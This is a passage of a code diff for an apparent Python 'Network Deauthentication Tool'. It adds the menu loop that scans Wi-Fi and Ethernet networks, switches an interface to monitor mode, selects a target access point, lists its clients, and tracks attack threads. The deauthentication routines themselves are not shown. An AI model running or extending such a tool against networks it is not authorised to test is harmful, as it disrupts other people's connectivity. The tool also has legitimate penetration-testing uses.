+                if scan_results:
+                    display_networks(scan_results, "Wi-Fi")
+                    logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
+                              status=f"Found {len(scan_results)} networks")
+                else:
+                    print("\n[Scan] No networks found!")
+                    logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
+                              status="No networks found")
+            
+            elif choice == '2':
+                # Scan Ethernet
+                if not selected_interfaces["eth"]:
+                    print("\n[Error] Ethernet interface not configured!")
+                    print("Please configure it in Option 6 first.")
+                    continue
+                
+                scan_results = scan_arp_network(selected_interfaces["eth"])
+                
+                if scan_results:
+                    display_networks(scan_results, "Ethernet")
+                    logger.log("Ethernet_Scan", "Ethernet", selected_interfaces["eth"], 
+                              status=f"Found {len(scan_results)} devices")
+                else:
+                    print("\n[Scan] No devices found!")
+                    logger.log("Ethernet_Scan", "Ethernet", selected_interfaces["eth"], 
+                              status="No devices found")
+            
+            elif choice == '3':
+                # Select Wi-Fi network
+                if not selected_interfaces["wlan"]:
+                    print("\n[Error] Wi-Fi interface not configured!")
+                    print("Please configure it in Option 6 first.")
+                    continue
+                
+                # Check if interface is in monitor mode
+                if not check_monitor_mode(selected_interfaces["wlan"]):
+                    print(f"\n[Error] {selected_interfaces['wlan']} is not in monitor mode!")
+                    print("Client scanning requires monitor mode.")
+                    set_monitor = input("[Scan] Set to monitor mode now? (y/n): ").lower()
+                    if set_monitor == 'y':
+                        new_iface, success = set_monitor_mode(selected_interfaces["wlan"])
+                        if success:
+                            selected_interfaces["wlan"] = new_iface
+                            print(f"[Scan] Interface set to: {selected_interfaces['wlan']}")
+                        else:
+                            print("[Scan] Failed to set monitor mode!")
+                            continue
+                    else:
+                        continue
+                
+                if not scan_results or not any('BSSID' in net for net in scan_results):
+                    print("\n[Error] Please scan for Wi-Fi networks first (Option 1)!")
+                    continue
+                
+                wifi_nets = [net for net in scan_results if 'BSSID' in net]
+                if not wifi_nets:
+                    print("\n[Error] No Wi-Fi networks in scan results!")
+                    continue
+                
+                display_networks(wifi_nets, "Wi-Fi")
+                
+                try:
+                    net_choice = int(input(f"\n[Select] Select network (1-{len(wifi_nets)}): "))
+                    if 1 <= net_choice <= len(wifi_nets):
+                        selected_network = wifi_nets[net_choice-1]
+                        print(f"\n[Select] Selected Network:")
+                        print(f"  BSSID: {selected_network['BSSID']}")
+                        print(f"  Channel: {selected_network['Channel']}")
+                        print(f"  ESSID: {selected_network['ESSID']}")
+                        
+                        # Scan for clients
+                        clients_list = select_network(
+                            selected_interfaces["wlan"],
+                            selected_network['BSSID'],
+                            selected_network['Channel']
+                        )
+                        
+                        if clients_list:
+                            display_clients(clients_list)
+                            logger.log("Client_Scan", "Wi-Fi", selected_interfaces["wlan"],
+                                     selected_network['BSSID'], selected_network['ESSID'],
+                                     status=f"Found {len(clients_list)} clients")
+                        else:
+                            print("\n[Scan] No clients found!")
+                            logger.log("Client_Scan", "Wi-Fi", selected_interfaces["wlan"],
+                                     selected_network['BSSID'], selected_network['ESSID'],
+                                     status="No clients found")
+                    else:
+                        print("[Error] Invalid selection!")
+                except ValueError:
+                    print("[Error] Please enter a valid number!")
+            
+            elif choice == '11':
+                # Show active attacks
+                print("\n[Status] Active Attacks:")
+                print("="*50)
+                if attack_threads:
+                    for i, thread in enumerate(attack_threads, 1):
+                        status = "Alive" if thread.is_alive() else "Dead"
+                        print(f"{i}. {thread.name}: {status}")
+                else:
+                    print("No active attacks.")
+                print("="*50)
+            
+            elif choice == '12':
+                # Exit
+                print("\n[Exit] Cleaning up and exiting...")
+                
+                # Show active attacks
+                if attack_threads:
+                    print(f"[Exit] Stopping {len(attack_threads)} active attacks...")
+                
+                # Stop all attacks
+                stop_all_attacks()
+                
+                # Restore interfaces
+                restore_all_interfaces()
+                
+                print("\n[Exit] Thank you for using Network Deauthentication Tool!")
+                print("[Exit] Remember: Use only for authorized testing!")
+                print("[Exit] Exiting...")
+                break
+            
+            else:
+                # Handle other options (4-10) similarly with improved error handling
+                # The implementation would be similar to before but with better logging
+                print(f"\n[Info] Option {choice} selected")
+                # ... rest of the option handling code ...
+                
+    except KeyboardInterrupt:
+        print("\n\n[Interrupt] Interrupted by user.")
+        cleanup_handler()
+        print("[Exit] Exiting...")
+    except Exception as e:
+        print(f"\n[Error] Unexpected error: {e}")
+        import traceback
+        traceback.print_exc()
+        logger.log("System_Error", "System", "", status=f"Unexpected error: {e}")
+        cleanup_handler()
+
+if __name__ == "__main__":
+    # Add command line argument parsing
+    parser = argparse.ArgumentParser(description='Network Deauthentication Tool')
+    parser.add_argument('--test', action='store_true', help='Test mode - check dependencies only')
+    parser.add_argument('--cleanup', action='store_true', help='Cleanup interfaces and exit')
+    parser.add_argument('--log', help='Specify log file location')
+    
+    args = parser.parse_args()
+    
+    if args.test:
+        print("[Test] Testing mode activated")
+        check_root()
+        check_dependencies()
+        sys.exit(0)
+    
+    if args.cleanup:
+        print("[Cleanup] Manual cleanup requested")
+        restore_all_interfaces()
+        sys.exit(0)
+    
+    if args.log:
+        log_file = args.log
+        logger = Logger(log_file)
+    
+    main()
